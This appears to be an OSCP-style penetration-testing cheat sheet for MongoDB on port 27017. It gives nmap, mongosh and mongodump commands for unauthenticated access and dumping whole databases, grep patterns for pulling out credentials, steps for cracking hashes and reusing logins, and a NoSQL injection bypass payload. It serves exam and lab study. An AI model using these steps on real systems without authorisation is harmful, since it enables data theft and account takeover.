# 🔧 MongoDB — Port 27017

> **NoSQL document database** (27017 default; 27018/27019 shard/config; 28017 legacy HTTP status). Auth **disabled by default** in many setups (SCRAM when enabled). On OSCP this is primarily a **data/credential surface**: `mongosh` lets you read every database — user tables, password hashes, API keys, sessions — which you then reuse against web/SSH. Direct RCE is rare; the value is the loot (and the schema, for web-app NoSQL injection).

Related: [[Credential Attacks]] · [[HTTP]] · [[SSH]]

---

## 🧠 PORT 27017 → THINK
- **Connect unauth with `mongosh`** → `show dbs` → dump user collections.
- Look for **password hashes / API keys / session tokens** → reuse everywhere.
- Backs a web app? → its **admin creds** likely live here.
- Auth enabled? → try creds from web configs; note version for CVEs.
- 27018/27019 = shard/config servers; 28017 = old web status UI.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p27017 -sV --script mongodb-info,mongodb-databases $IP
```

```bash
mongosh "mongodb://$IP:27017" --eval "db.adminCommand('listDatabases')"
```
**Verdict:** databases list without creds → dump them. Auth required → try reused creds; note version.

## ⏱️ ENUMERATE
```bash
mongosh "mongodb://$IP:27017"
# inside:
#   show dbs
#   use <dbname>
#   show collections
#   db.<collection>.find().pretty()      -> read documents (creds/hashes!)
#   db.users.find()                       -> app users
# Older client alternative: mongo $IP:27017 (same commands)
```

```bash
# Dump everything for offline review
mongodump --host $IP --port 27017 --out mongo_dump/     # if unauth
```

```bash
grep -rniE 'pass|hash|token|api[_-]?key' mongo_dump/
```
**Look for:** `users`/`accounts`/`admin` collections with cleartext creds, bcrypt/other hashes (→ crack), API keys, tokens, config collections.

## 🗡️ EXPLOIT
- 🟢 **Unauth read → dump user collections → reuse creds/crack hashes.**
- 🟡 **Reused web-config creds** to authenticate when auth is on.
- 🟡 **NoSQL injection** on the web app (auth bypass `{"$ne":null}` etc.) — tested via [[HTTP]], informed by the schema here.
- 🔵 **Version-specific CVEs** — confirm exact version; rare on OSCP.

Mongo itself rarely yields a shell. The chain:
```bash
mongosh "mongodb://$IP:27017" --eval 'db.getSiblingDB("app").users.find().forEach(printjson)'
```
1. Unauth connect → `db.users.find()` → grab admin password/hash.
2. If hash → crack (`hashcat`, correct mode for the hash type) → cleartext.
3. Reuse on the **web admin panel** (→ often file upload/RCE) or [[SSH]].

**After access:** dump all DBs (`mongodump`), extract every credential/token, run them through the [[Credential Attacks]] reuse matrix; note schema for possible NoSQLi.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `show dbs` w/o auth | Unauth Mongo | dump collections | creds/hashes |
| Admin creds/hash in `users` | App takeover | crack → web admin login | RCE via upload |
| API keys/tokens | Secrets | reuse against APIs | access |
| Auth required | Protected | try web-config creds | data |
| Schema known | NoSQLi possible | test web `$ne`/`$gt` | auth bypass |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Auth required | Try reused creds from web configs; check for weak/default admin |
| `mongosh` not installed | Use legacy `mongo` client, or `nmap --script mongodb-*`, or `mongodump` |
| Connect refused | Bound to localhost — port-forward after foothold ([[Pivoting and Port Forwarding]]) |
| Hashes won't crack | Note the algorithm; focus on cleartext secrets/tokens instead |
| Empty/uninteresting DBs | Note and move on — not every Mongo is loaded |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** not trying **unauthenticated `mongosh`** first · only glancing at DB names (creds live in `find()` output — **read the documents**) · forgetting to **reuse** dumped creds on web/SSH · ignoring the schema for **NoSQL injection** on the front-end.
**Reuse:** dumped creds/hashes/tokens → [[HTTP]] admin panels, [[SSH]], APIs, other DBs; web `.env`/config → Mongo creds. See [[Credential Attacks]].
**Don't miss:** unauth `mongosh` connect · `show dbs` → `find()` on user collections · `mongodump` for offline grep · crack hashes / grab tokens · reuse creds on web + SSH · note schema for web NoSQLi.
**Stop when:** auth required with no working creds, or DBs hold nothing useful → note and move on; revisit with creds or after a foothold (localhost). Loot → work continues in [[Credential Attacks]] / [[HTTP]].

## 📇 CHEAT SHEET
```bash
nmap -p27017 --script mongodb-info,mongodb-databases $IP
```

```bash
mongosh "mongodb://$IP:27017" --eval "db.adminCommand('listDatabases')"
```

```bash
mongosh "mongodb://$IP:27017"    # show dbs; use app; show collections; db.users.find().pretty()
```

```bash
mongodump --host $IP --port 27017 --out mongo_dump/
```

```bash
grep -rniE 'pass|hash|token|key' mongo_dump/
```
**Kill shots:** unauth dump → app admin creds → web login → RCE · hashes → crack → SSH reuse.
